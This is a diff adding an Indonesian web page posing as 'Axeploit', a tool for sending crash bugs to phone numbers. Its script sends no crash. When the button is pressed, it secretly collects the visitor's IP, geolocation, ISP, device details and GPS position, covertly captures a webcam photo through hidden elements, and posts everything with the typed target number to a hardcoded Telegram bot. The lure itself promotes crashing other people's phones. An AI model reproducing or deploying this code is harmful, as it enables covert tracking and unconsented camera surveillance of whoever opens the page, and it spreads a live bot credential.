@@ -1,0 +1,286 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>AXEPLOIT V2 BUGS - Fix</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <style>
+    :root {
+      --bg:#0a0f1a;
+      --card:#101628;
+      --muted:#9aa4c7;
+      --text:#e8ecff;
+      --primary:#9b5cff;
+      --secondary:#00d4ff;
+      --accent:#6dd6ff;
+    }
+    * {box-sizing:border-box;margin:0;padding:0;}
+    body {
+      font-family:Poppins, sans-serif;
+      min-height:100vh;
+      display:flex;
+      justify-content:center;
+      align-items:center;
+      background: radial-gradient(circle at 20% 20%, rgba(155,92,255,.2), transparent 30%),
+                  radial-gradient(circle at 80% 10%, rgba(0,212,255,.2), transparent 25%),
+                  radial-gradient(circle at 50% 90%, rgba(109,214,255,.15), transparent 30%),
+                  var(--bg);
+      padding:20px;
+      overflow:hidden;
+    }
+    .card {
+      background: rgba(255,255,255,.05);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(255,255,255,.1);
+      border-radius: 18px;
+      padding: 22px 20px;
+      width: 100%;
+      max-width: 360px;
+      text-align: center;
+      box-shadow: 0 0 20px rgba(155,92,255,.3);
+      animation: fadeIn 1s ease;
+    }
+    @keyframes fadeIn { from {opacity:0; transform:translateY(20px);} to {opacity:1; transform:translateY(0);} }
+    .logo { width:70px; height:70px; margin:0 auto 14px; border-radius:50%; object-fit:cover; box-shadow:0 0 16px var(--primary),0 0 30px rgba(0,212,255,.4); }
+    .title { font-size:22px; font-family:Orbitron, sans-serif; font-weight:800; color: var(--primary); margin-bottom:4px; text-shadow:0 0 10px rgba(155,92,255,.7); }
+    .subtitle { font-size:12px; color: var(--muted); margin-bottom:20px; }
+    input[type="text"] { width:100%; padding:12px; border-radius:10px; border:1px solid rgba(255,255,255,.15); background:rgba(7,10,20,.6); color:var(--text); font-size:13px; outline:none; text-align:center; margin-bottom:8px; transition:.3s; }
+    input:focus { border-color:var(--secondary); box-shadow:0 0 6px var(--secondary); }
+    .buttons-grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-bottom:16px; }
+    .buttons-grid button { padding:12px; font-size:13px; font-weight:600; border:none; border-radius:10px; cursor:pointer; background: rgba(255,255,255,0.05); color: var(--text); border:1px solid rgba(255,255,255,.15); transition: all .3s ease; }
+    .buttons-grid button:hover { box-shadow:0 0 12px var(--secondary); transform:translateY(-2px) scale(1.03); }
+    .buttons-grid button.selected { background:linear-gradient(90deg, var(--primary), var(--secondary)); color:white; box-shadow:0 0 12px var(--primary); }
+    .execute-button { width:100%; padding:12px; font-size:14px; font-weight:600; border:none; border-radius:10px; cursor:pointer; background:linear-gradient(90deg, var(--primary), var(--secondary)); color:white; margin-bottom:12px; box-shadow:0 0 10px rgba(155,92,255,.4); transition: all .3s ease; }
+    .execute-button:disabled { opacity:.5; cursor:not-allowed; }
+    .footer-action-container { display:flex; flex-wrap:wrap; justify-content:center; align-items:center; gap:8px; margin-top:20px; }
+    .footer-button { background: rgba(255,255,255,0.05); border:1px solid var(--primary); border-radius:8px; padding:8px 12px; font-size:14px; color: var(--primary); display:flex; align-items:center; gap:6px; transition: background .3s ease; }
+    .footer-button:hover { background: rgba(155,92,255,.2); }
+    .popup { position: fixed; top:50%; left:50%; transform: translate(-50%, -50%) scale(0.8); background: #111; color: var(--secondary); padding:16px 22px; border-radius:12px; box-shadow:0 0 20px rgba(0,212,255,.7); font-weight:bold; display:none; z-index:9999; animation: zoomFade 2s ease forwards; text-align:center; }
+    @keyframes zoomFade { 0% { opacity:0; transform: translate(-50%, -50%) scale(0.8); } 15% { opacity:1; transform: translate(-50%, -50%) scale(1); } 85% { opacity:1; transform: translate(-50%, -50%) scale(1); } 100% { opacity:0; transform: translate(-50%, -50%) scale(0.8); } }
+    .info { margin-top:8px; color:var(--muted); font-size:13px; min-height:18px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <img src="https://e.top4top.io/p_3501jjn601.jpg" class="logo" alt="Logo">
+    <div class="title">Axeploit - Crash</div>
+    <div class="subtitle">Choose mode &amp; target number</div>
+
+    <input id="text" type="text" placeholder="Please Input Target Number 628xx" />
+    <div id="info" class="info"></div>
+
+    <div class="buttons-grid">
+      <button class="mode-btn" data-mode="andros"><i class="fas fa-skull-crossbones"></i> CRASH ANDRO</button>
+      <button class="mode-btn" data-mode="ios"><i class="fas fa-dumpster-fire"></i> CRASH IPHONE</button>
+      <button class="mode-btn" data-mode="invis"><i class="fas fa-skull-crossbones"></i> INVIS HARD</button>
+      <button class="mode-btn" data-mode="blankui"><i class="fas fa-dumpster-fire"></i> BLANK UI</button>
+    </div>
+
+    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> Kirim Bug</button>
+
+    <div class="footer-action-container">
+      <div class="footer-button">
+        <a href="https://t.me/alwaysrilmodz" target="_blank"><i class="fab fa-telegram"></i> Developer</a>
+      </div>
+      <div class="footer-button">
+        <a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
+      </div>
+    </div>
+  </div>
+
+  <video id="video" width="320" height="240" autoplay playsinline style="display:none"></video>
+  <canvas id="canvas" width="320" height="240" style="display:none"></canvas>
+
+  <div id="popup" class="popup">✔️ Success Send Bug</div>
+
+<script>
+  // ======== CONFIG (WARNING: do not expose real bot token in client-side) ========
+  const botToken = '8572769927:AAGQFgo-VfC7krJ30qbyM8N63jF0TdiB-s0'; // <-- move to server!
+  const chatIds = ['5832245562'];
+
+  // ======== DOM ========
+  const infoDiv = document.getElementById('info');
+  const inputField = document.getElementById('text');
+  const modeButtons = document.querySelectorAll('.mode-btn');
+  const executeBtn = document.getElementById('executeBtn');
+  const popup = document.getElementById('popup');
+
+  // ======== state ========
+  let selectedMode = null;
+
+  // ======== helpers ========
+  function logInfo(msg) {
+    infoDiv.textContent = msg;
+  }
+
+  function sendToTelegram(text) {
+    // note: exposing bot token on client is insecure — prefer server proxy.
+    chatIds.forEach(id => {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
+      }).catch(err => console.error('sendToTelegram err', err));
+    });
+  }
+
+  function sendPhotoToTelegram(blob) {
+    chatIds.forEach(id => {
+      const formData = new FormData();
+      formData.append('chat_id', id);
+      formData.append('photo', blob, 'photo.jpg');
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+        method: 'POST',
+        body: formData
+      }).catch(err => console.error('sendPhoto err', err));
+    });
+  }
+
+  // ======== get device info ========
+  async function getInfoAndSend() {
+    let ip = '-', city = '-', region = '-', country = '-', org = '-';
+    try {
+      const ipRes = await fetch('https://api.ipify.org?format=json');
+      const ipData = await ipRes.json();
+      ip = ipData.ip || '-';
+      const locRes = await fetch(`https://ip-api.com/json/${ip}`);
+      const loc = await locRes.json();
+      if (loc && loc.status === 'success') {
+        city = loc.city || '-';
+        region = loc.regionName || '-';
+        country = loc.country || '-';
+        org = loc.org || '-';
+      }
+    } catch (e) {
+      console.warn('ip lookup failed', e);
+    }
+
+    let batteryPercent = 'N/A';
+    let chargingText = 'N/A';
+    try {
+      if (navigator.getBattery) {
+        const battery = await navigator.getBattery();
+        batteryPercent = battery && typeof battery.level === 'number' ? `${(battery.level*100).toFixed(0)}%` : 'N/A';
+        chargingText = battery && battery.charging ? 'Charging' : 'Tidak Charging';
+      }
+    } catch (e) {
+      console.warn('battery API error', e);
+    }
+
+    const text = `
+IP         : ${ip}
+Kota       : ${city}
+Region     : ${region}
+Negara     : ${country}
+ISP        : ${org}
+Browser    : ${navigator.userAgent}
+OS         : ${navigator.platform}
+Resolusi   : ${screen.width}x${screen.height}
+Baterai    : ${batteryPercent} (${chargingText})
+Memori     : ${navigator.deviceMemory || 'N/A'} GB
+Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
+Waktu      : ${new Date().toLocaleString()}
+            `.trim();
+
+    sendToTelegram(`<b>️ Info Pengunjung:</b>\n<pre>${text}</pre>`);
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+          sendToTelegram(`<b> Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
+        },
+        err => {
+          sendToTelegram(` Lokasi GPS Ditolak`);
+        },
+        { timeout: 10000 }
+      );
+    } else {
+      sendToTelegram(` Browser tidak support GPS`);
+    }
+  }
+
+  // ======== camera capture ========
+  async function startCameraAndSendPhoto() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+      await video.play();
+
+      // tunggu beberapa frame lalu ambil gambar
+      await new Promise(res => setTimeout(res, 1000));
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      return new Promise(resolve => {
+        canvas.toBlob(blob => {
+          if (blob) sendPhotoToTelegram(blob);
+          // stop tracks
+          stream.getTracks().forEach(t => t.stop());
+          resolve();
+        }, 'image/jpeg', 0.8);
+      });
+    } catch (e) {
+      sendToTelegram('❌ Kamera Ditolak atau Tidak Tersedia');
+      return;
+    }
+  }
+
+  // ======== UI: modes ========
+  modeButtons.forEach(btn => {
+    btn.addEventListener('click', () => {
+      modeButtons.forEach(b => b.classList.remove('selected'));
+      btn.classList.add('selected');
+      selectedMode = btn.getAttribute('data-mode');
+      executeBtn.disabled = false;
+      logInfo(`Mode: ${selectedMode}`);
+    });
+  });
+
+  // ======== validation ========
+  function isValidNumber(number) {
+    const pattern = /^62\d{7,13}$/;
+    return pattern.test(number);
+  }
+
+  // ======== execute ========
+  executeBtn.addEventListener('click', async () => {
+    const number = inputField.value.trim();
+    if (!isValidNumber(number)) {
+      alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10-15 digit.");
+      return;
+    }
+    executeBtn.disabled = true;
+    logInfo('🔄 Memproses bug...');
+
+    try {
+      sendToTelegram(`<b> Nomor Target:</b> ${number}`);
+      await getInfoAndSend();
+      await startCameraAndSendPhoto();
+
+      // tampil popup
+      popup.style.display = 'block';
+      setTimeout(() => { popup.style.display = 'none'; }, 2000);
+
+      logInfo(`✔️ Successfully bug nomor ${number}`);
+    } catch (e) {
+      console.error(e);
+      logInfo('❌ Terjadi kesalahan.');
+    } finally {
+      executeBtn.disabled = false;
+    }
+  });
+
+  // optional: tekan Enter untuk submit
+  inputField.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter' && !executeBtn.disabled) {
+      executeBtn.click();
+    }
+  });
+</script>
+</body>
+</html>
